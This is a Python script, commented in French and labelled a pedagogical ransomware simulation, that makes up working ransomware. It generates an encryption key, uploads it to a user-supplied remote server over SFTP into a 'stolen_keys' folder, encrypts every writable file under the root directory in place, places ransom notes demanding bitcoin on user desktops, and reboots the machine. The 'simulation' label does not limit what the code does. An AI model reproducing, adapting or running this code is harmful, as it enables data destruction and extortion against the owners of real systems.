#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique complète
# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)

import logging
import os
import socket
import subprocess
import sys
import time
import paramiko
from cryptography.fernet import Fernet

# Configuration initiale
LOG_FILE = "/var/log/ransomware_sim.log"
SFTP_KEY_PATH = "/tmp/encryption_key.key"

# Initialisation du logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class RansomwareSimulator:
    def __init__(self):
        self.fernet = None
        self.key = None
        self.sftp_config = {
            'server': None,
            'port': 22,
            'user': None,
            'password': None
        }

    def check_root(self):
        """Vérifie les privilèges root"""
        if os.geteuid() != 0:
            logging.error("Le script doit être exécuté en tant que root!")
            sys.exit(1)

    def generate_key(self):
        """Génère une clé de chiffrement Fernet"""
        try:
            self.key = Fernet.generate_key()
            with open(SFTP_KEY_PATH, "wb") as key_file:
                key_file.write(self.key)
            self.fernet = Fernet(self.key)
            logging.info(f"Clé générée: {SFTP_KEY_PATH}")
            print(f"\n[+] Clé générée: {SFTP_KEY_PATH}")
            return True
        except Exception as e:
            logging.error(f"Erreur génération clé: {str(e)}")
            return False

    def configure_sftp(self):
        """Configure les paramètres SFTP"""
        print("\n[ Configuration SFTP ]")
        self.sftp_config['server'] = input("IP du serveur SFTP: ").strip()
        self.sftp_config['user'] = input("Utilisateur SFTP: ").strip()
        self.sftp_config['password'] = input("Mot de passe SFTP: ").strip()
        port = input("Port SFTP [22]: ").strip()
        self.sftp_config['port'] = int(port) if port else 22

    def send_key_via_sftp(self):
        """Transmet la clé via SFTP"""
        if not self.key:
            print("\n[!] Générer d'abord une clé")
            return False

        try:
            transport = paramiko.Transport((self.sftp_config['server'], self.sftp_config['port']))
            transport.connect(username=self.sftp_config['user'], password=self.sftp_config['password'])
            sftp = paramiko.SFTPClient.from_transport(transport)

            remote_dir = f"/home/{self.sftp_config['user']}/stolen_keys"
            try:
                sftp.mkdir(remote_dir)
            except IOError:
                pass

            remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
            sftp.put(SFTP_KEY_PATH, remote_path)
            sftp.close()
            transport.close()

            logging.info(f"Clé envoyée à {self.sftp_config['server']}:{remote_path}")
            print(f"\n[+] Clé envoyée à {self.sftp_config['server']}")
            return True
        except Exception as e:
            logging.error(f"Échec SFTP: {str(e)}")
            print(f"\n[!] Échec envoi: {str(e)}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier en place"""
        try:
            # Vérification supplémentaire pour éviter les fichiers spéciaux
            if not os.path.isfile(filepath) or os.path.islink(filepath):
                return False

            with open(filepath, "rb") as f:
                original = f.read()

            encrypted = self.fernet.encrypt(original)

            with open(filepath, "wb") as f:
                f.write(encrypted)

            return True
        except Exception as e:
            logging.warning(f"Erreur sur {filepath}: {str(e)}")
            return False

    def encrypt_system(self):
        """Chiffre tous les fichiers accessibles"""
        if not self.fernet:
            print("\n[!] Générer d'abord une clé")
            return

        print("\n[!] ATTENTION: Chiffrement complet du système!")
        confirm = input("Confirmez (tapez 'CHIFFRER'): ")
        if confirm != "CHIFFRER":
            print("Annulé")
            return

        exclude_dirs = {
            '/proc', '/sys', '/dev', '/run', '/tmp',
            '/var/run', '/var/lock', '/snap'
        }

        total = 0
        start_time = time.time()

        for root, _, files in os.walk('/'):
            if any(root.startswith(ex) for ex in exclude_dirs):
                continue

            for file in files:
                filepath = os.path.join(root, file)
                try:
                    if os.access(filepath, os.W_OK):
                        if self.encrypt_file(filepath):
                            total += 1
                            if total % 100 == 0:
                                print(f"\r[+] Fichiers chiffrés: {total}", end='')
                except Exception as e:
                    continue

        logging.info(f"Chiffrement terminé: {total} fichiers en {time.time()-start_time:.2f}s")
        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")

    def create_ransom_note(self):
        """Crée le fichier README sur le bureau"""
        note = f"""
        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!

        Pour récupérer vos données:
        1. Envoyez 0.5 BTC à: 1Ma1wareSimu1BitcoinAddres5
        2. Contactez: ransomware@example.com
        ID: {socket.gethostname()}
        """

        # Place le README sur tous les bureaux trouvés
        created = 0
        for root, dirs, _ in os.walk('/home'):
            if 'Desktop' in dirs:
                path = os.path.join(root, 'Desktop', 'README.txt')
                try:
                    with open(path, 'w') as f:
                        f.write(note)
                    created += 1
                except:
                    continue

        # Ajoute aussi à la racine
        try:
            with open('/README.txt', 'w') as f:
                f.write(note)
            created += 1
        except:
            pass

        print(f"\n[+] {created} notes de rançon placées")

    def reboot_system(self):
        """Redémarre le système"""
        print("\n[!] Redémarrage en cours...")
        logging.info("Déclenchement du redémarrage")
        try:
            subprocess.run(['reboot'], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Échec redémarrage: {str(e)}")
            sys.exit(1)

    def show_menu(self):
        """Affiche le menu principal"""
        while True:
            print("\n" + "="*50)
            print(" RANSOMWARE SIMULATEUR - MENU PRINCIPAL")
            print("="*50)
            print("1. Générer une clé de chiffrement")
            print("2. Configurer le serveur SFTP")
            print("3. Envoyer la clé via SFTP")
            print("4. Chiffrer TOUS les fichiers (/)")
            print("5. Placer les notes de rançon")
            print("6. Redémarrer le système")
            print("0. Quitter")
            print("="*50)

            choice = input("\nVotre choix: ").strip()

            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.configure_sftp()
            elif choice == "3":
                self.send_key_via_sftp()
            elif choice == "4":
                self.encrypt_system()
            elif choice == "5":
                self.create_ransom_note()
            elif choice == "6":
                self.reboot_system()
            elif choice == "0":
                print("\n[+] Fermeture du programme.")
                sys.exit(0)
            else:
                print("\n[!] Choix invalide")

def main():
    """Fonction principale"""
    simulator = RansomwareSimulator()
    simulator.check_root()
    logging.info("=== Démarrage du simulateur ===")
    simulator.show_menu()

if __name__ == "__main__":
    main()